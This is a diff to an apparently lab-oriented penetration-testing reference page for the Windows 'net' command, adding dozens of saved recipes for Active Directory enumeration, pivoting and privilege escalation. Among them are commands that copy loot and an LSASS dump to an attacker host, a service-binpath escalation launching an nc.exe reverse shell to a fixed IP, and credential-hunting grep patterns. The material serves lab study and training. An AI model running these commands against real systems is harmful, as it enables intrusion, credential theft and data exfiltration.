@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=net) · [All tools](/index)
+
 ## Commands
 
 **Windows cmd.exe**
@@ -24,8 +26,556 @@ net accounts /domain
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=net%20user)
+## Notebook recipes
 
-## Learning and original examples
+39 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [Enumerate Active Directory with Built-in Tools](/active-directory/living-off-the-land)
+<AccordionGroup>
+
+<Accordion title="Windows — inspect the current session">
+
+### Windows — inspect the current session
+
+**AD groups and effective access**
+
+```cmd
+whoami /groups
+whoami /priv
+net user USER /domain
+```
+
+</Accordion>
+
+<Accordion title="11. File transfer over a pivot">
+
+### 11. File transfer over a pivot
+
+**Active Directory Attack Path: Worked Lab**
+
+```bash
+# run the SMB/HTTP server on DMZ01 (172.16.119.13), not Kali; then from the internal host:
+net use \\172.16.119.13\share /user:grcan grcan123
+copy C:\loot.zip \\172.16.119.13\share\
+# then pull DMZ01 -> Kali over SSH:  scp jbetty@<DMZ>:/path/loot.zip ~/loot/
+```
+
+**Active Directory Attack Path: Worked Lab**
+
+Context from the notebook: Reachability rule:  the pivot is  one‑way  (Kali → internal). Internal hosts  cannot  reach your external Kali IP — so  net use \\&lt;KALI>\share  from the DC fails with  System error 53 , and  proxychains impacket-smbserver  does NOT help (proxychains only proxies  outbound clients , not a  listening server ).
+
+```text
+net use \\<KALI>\share
+```
+
+</Accordion>
+
+<Accordion title="Groups">
+
+### Groups
+
+**Active Directory Enumeration Commands**
+
+```bash
+nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN> --groups
+    # Enumerate domain groups
+
+net rpc group list -U '<DOMAIN>/<USER>%<PASSWORD>' -S <DC_IP>
+    # List domain groups
+
+net rpc group members '<GROUP>' -U '<DOMAIN>/<USER>%<PASSWORD>' -S <DC_IP>
+    # Show members of a domain group
+
+net rpc user info <USER> -U '<DOMAIN>/<USER>%<PASSWORD>' -S <DC_IP>
+    # Show the groups a domain user belongs to
+```
+
+</Accordion>
+
+<Accordion title="Quick Htb Workflow">
+
+### Quick Htb Workflow
+
+**Active Directory Enumeration Commands**
+
+```bash
+# 1. Verify credentials
+nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN>
+
+# 2. Enumerate shares
+nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN> --shares
+
+# 3. Check user information / groups
+net rpc user info <USER> -U '<DOMAIN>/<USER>%<PASSWORD>' -S <DC_IP>
+
+# 4. Enumerate domain groups
+net rpc group list -U '<DOMAIN>/<USER>%<PASSWORD>' -S <DC_IP>
+
+# 5. Check LDAP
+nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN>
+
+# 6. Look for Kerberoastable accounts
+GetUserSPNs.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
+
+# 7. Check WinRM access
+nxc winrm <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN>
+
+# 8. If WinRM works, connect
+evil-winrm -i <DC_IP> -u <USER> -p '<PASSWORD>'
+```
+
+</Accordion>
+
+<Accordion title="Users">
+
+### Users
+
+**Active Directory Enumeration Commands**
+
+```bash
+nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN> --users
+    # Enumerate domain users
+
+nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN> --users
+    # Enumerate users through LDAP
+
+GetADUsers.py -all -dc-ip <DC_IP> '<DOMAIN>/<USER>:<PASSWORD>'
+    # Query AD for domain users
+
+net rpc user info <USER> -U '<DOMAIN>/<USER>%<PASSWORD>' -S <DC_IP>
+    # Show information and group memberships for a user
+```
+
+</Accordion>
+
+<Accordion title="Windows Local Groups">
+
+### Windows Local Groups
+
+**Active Directory Enumeration Commands**
+
+```powershell
+net localgroup
+    # List local groups on a Windows machine
+
+net localgroup Administrators
+    # Show members of the local Administrators group
+
+net localgroup "Remote Management Users"
+    # Show users allowed to use WinRM
+
+net localgroup "Backup Operators"
+    # Show members of Backup Operators
+
+net localgroup "Server Operators"
+    # Show members of Server Operators
+
+whoami /groups
+    # Show groups belonging to the current Windows account
+
+whoami /priv
+    # Show privileges assigned to the current Windows account
+```
+
+</Accordion>
+
+<Accordion title="RDP Session Hijacking">
+
+### RDP Session Hijacking
+
+**Common Services: Full Module Reference**
+
+```cmd
+C:\htb> net start sessionhijack
+```
+
+</Accordion>
+
+<Accordion title="Windows">
+
+### Windows
+
+**Common Services: Full Module Reference**
+
+```cmd
+C:\htb> net use n: \\192.168.220.129\Finance
+
+The command completed successfully.
+```
+
+**Common Services: Full Module Reference**
+
+```cmd
+C:\htb> net use n: \\192.168.220.129\Finance /user:plaintext Password123
+
+The command completed successfully.
+```
+
+</Accordion>
+
+<Accordion title="6. Net Commands">
+
+### 6. Net Commands
+
+**Enumerate Active Directory with Built-in Tools**
+
+```powershell
+net accounts /domain
+```
+
+**Enumerate Active Directory with Built-in Tools**
+
+```powershell
+net group /domain
+```
+
+**Enumerate Active Directory with Built-in Tools**
+
+```powershell
+net group "Domain Admins" /domain
+```
+
+**Enumerate Active Directory with Built-in Tools**
+
+```powershell
+net user /domain
+```
+
+**Enumerate Active Directory with Built-in Tools**
+
+```powershell
+net user <ACCOUNT_NAME> /domain
+```
+
+</Accordion>
+
+<Accordion title="SMB Downloads">
+
+### SMB Downloads
+
+**File Transfers for Linux and Windows**
+
+```cmd
+net use n: \\<ATTACKER_IP>\share /user:test test
+copy n:\nc.exe
+```
+
+**File Transfers for Linux and Windows**
+
+```powershell
+net use \\10.10.14.249\CompData /user:grcan grcan123
+move "Summary-Report-inlanefreight.local.html" \\10.10.14.249\CompData
+```
+
+</Accordion>
+
+<Accordion title="Find Credentials in Network Shares">
+
+### Find Credentials in Network Shares
+
+**Find Credentials in Network Shares**
+
+```bash
+# the domain prefix (most reliable signal)
+grep -ri "DOMAINNAME\\\\" .
+
+# UPN format
+grep -riE "[a-z]+@domain\.local" .
+
+# runas / net use / Invoke-Command patterns - operators leak creds in commands
+grep -riE "runas|net use|Invoke-Command|New-PSSession|ConvertTo-SecureString" .
+
+# anything with "service account" / "svc_" in filenames
+find . -iname "*svc*" -o -iname "*service*account*"
+```
+
+</Accordion>
+
+<Accordion title="Pulling files FROM the target to Kali (the hard direction)">
+
+### Pulling files FROM the target to Kali (the hard direction)
+
+**Pivoting and File Transfer: Field Reference**
+
+```bash
+# 1) evil-winrm has it built in (pulls over your existing session):
+*Evil-WinRM* PS> download C:\Temp\lsass.dmp /home/kali/loot/lsass.dmp
+*Evil-WinRM* PS> upload /home/kali/tools/PrintSpoofer64.exe   # the reverse
+
+# 2) Stage through the DMZ (a host the internal box CAN reach):
+#    run smbserver on DMZ01, push from internal host, then SSH-pull DMZ->Kali
+impacket-smbserver share /tmp -smb2support -username u -password p     # ON DMZ01
+#    on the internal host:
+net use \\172.16.119.13\share /user:u p
+copy C:\Temp\loot.zip \\172.16.119.13\share\
+#    DMZ -> Kali:
+scp jbetty@<DMZ_IP>:/tmp/loot.zip ~/loot/
+
+# 3) Reverse forward (ligolo listener_add or chisel/ssh -R), then smbserver/nc ON Kali
+#    becomes reachable from inside, push to it normally.
+
+# 4) base64 paste (small files / when nothing else works):
+#    Windows:  [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\x")) | clip
+#    Kali:     echo '<paste>' | base64 -d > x
+```
+
+</Accordion>
+
+<Accordion title="Quick-start command cheat (run first, always)">
+
+### Quick-start command cheat (run first, always)
+
+**Privilege Escalation: Choose a Checklist**
+
+```powershell
+# 1. Automated
+iwr -Uri "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe" -OutFile "C:\temp\winPEAS.exe"
+C:\temp\winPEAS.exe
+
+# 2. Manual "big 5"
+whoami /priv
+whoami /groups
+systeminfo
+net user; net localgroup administrators
+Get-WmiObject win32_service | ? {$_.StartMode -eq 'Auto' -and $_.State -ne 'Running'}
+```
+
+</Accordion>
+
+<Accordion title="Domain context">
+
+### Domain context
+
+**Windows Post-Exploitation: Field Reference**
+
+```cmd
+net user <name> /domain                      :: domain account info
+net group "Domain Admins" /domain            :: who are the DAs
+nltest /dclist:<domain>                       :: list DCs
+echo %LOGONSERVER%                            :: which DC logged you in
+```
+
+</Accordion>
+
+<Accordion title="The box &amp; the users">
+
+### The box & the users
+
+**Windows Post-Exploitation: Field Reference**
+
+```cmd
+systeminfo                                   :: OS build/patch level (for kernel exploits)
+hostname & ver
+net user                                     :: local users
+net user <name>                              :: groups + last logon of a user
+net localgroup administrators                :: who is local admin
+net localgroup "Remote Desktop Users"        :: who can RDP
+net localgroup "Remote Management Users"     :: who can WinRM
+query user                                   :: WHO IS LOGGED IN RIGHT NOW (jump-host gold)
+```
+
+</Accordion>
+
+<Accordion title="EoP - Processes Enumeration and Tasks">
+
+### EoP - Processes Enumeration and Tasks
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+tasklist /v
+net start
+sc query
+Get-Service
+Get-Process
+Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
+```
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+net start
+wmic service list brief
+tasklist /SVC
+```
+
+</Accordion>
+
+<Accordion title="Example with Windows XP SP1 - upnphost">
+
+### Example with Windows XP SP1 - upnphost
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+# NOTE: spaces are mandatory for this exploit to work !
+sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe 10.11.0.73 4343 -e C:\WINDOWS\System32\cmd.exe"
+sc config upnphost obj= ".\LocalSystem" password= ""
+sc qc upnphost
+sc config upnphost depend= ""
+net start upnphost
+```
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+sc config SSDPSRV start=auto
+net start SSDPSRV
+net stop upnphost
+net start upnphost
+
+sc config upnphost depend=""
+```
+
+</Accordion>
+
+<Accordion title="Network Enumeration">
+
+### Network Enumeration
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+net share
+powershell Find-DomainShare -ComputerDomain domain.local
+```
+
+</Accordion>
+
+<Accordion title="User Enumeration">
+
+### User Enumeration
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+net user
+whoami /all
+Get-LocalUser | ft Name,Enabled,LastLogon
+Get-ChildItem C:\Users -Force | select Name
+```
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+$env:usernadsc
+net accounts
+```
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+net user administrator
+net user admin
+net user %USERNAME%
+```
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+net localgroup
+Get-LocalGroup | ft Name
+```
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+net localgroup administrators
+Get-LocalGroupMember Administrators | ft Name, PrincipalSource
+Get-LocalGroupMember Administrateurs | ft Name, PrincipalSource
+```
+
+</Accordion>
+
+<Accordion title="Key Enumeration Methods">
+
+### Key Enumeration Methods
+
+**AD Password Policies and User Lists**
+
+Context from the notebook: Without Credentials:  You can test for a NULL session from Windows using the  net use \\&lt;HOST>\ipc$ "" /u:""  command. The section also shows common error codes you might receive when authentication fails, which can help diagnose if an account is disabled, locked out, or if the password is simply incorrect.
+
+```text
+net use \\<HOST>\ipc$ "" /u:""
+```
+
+</Accordion>
+
+<Accordion title="8. Windows privesc">
+
+### 8. Windows privesc
+
+**Active Directory Attack Path: Worked Lab**
+
+Context from the notebook: Then:  net user ,  net localgroup administrators ,  systeminfo ,  ipconfig /all ,  netstat -ano .
+
+```text
+net user
+```
+
+**Active Directory Attack Path: Worked Lab**
+
+Context from the notebook: Then:  net user ,  net localgroup administrators ,  systeminfo ,  ipconfig /all ,  netstat -ano .
+
+```text
+net localgroup administrators
+```
+
+</Accordion>
+
+<Accordion title="🚨 GLOBAL CAVEATS (the stuff that wasted hours)">
+
+### 🚨 GLOBAL CAVEATS (the stuff that wasted hours)
+
+**Active Directory Attack Path: Worked Lab**
+
+Context from the notebook: net use \\KALI\..  →  System error 53 Internal host can't reach your external IP evil-winrm download ; or stage via DMZ host
+
+```text
+net use \\KALI\..
+```
+
+</Accordion>
+
+<Accordion title="ACL / object‑control edges (the escalation bread‑and‑butter)">
+
+### ACL / object‑control edges (the escalation bread‑and‑butter)
+
+**BloodHound: Full Reference**
+
+Context from the notebook: ForceChangePassword Reset their password (no old pw) bloodyAD ... set password &lt;target> 'NewPass123!'  or  net rpc password
+
+```text
+net rpc password
+```
+
+</Accordion>
+
+<Accordion title="Enforcement in Active Directory">
+
+### Enforcement in Active Directory
+
+**Password Policy Concepts and Remediation**
+
+Context from the notebook: Read the current policy as an attacker with:  net accounts ,  nxc smb &lt;DC> -u u -p p --pass-pol , or  (Get-ADDefaultDomainPasswordPolicy) .
+
+```text
+net accounts
+```
+
+</Accordion>
+
+<Accordion title="The reachability rule — pivots are usually ONE‑WAY">
+
+### The reachability rule — pivots are usually ONE‑WAY
+
+**Pivoting and File Transfer: Field Reference**
+
+Context from the notebook: That's why  net use \\&lt;KALI_IP>\share  from a DC fails with  System error 53  — the DC has no route back to your external address.
+
+```text
+net use \\<KALI_IP>\share
+```
+
+</Accordion>
+
+</AccordionGroup>
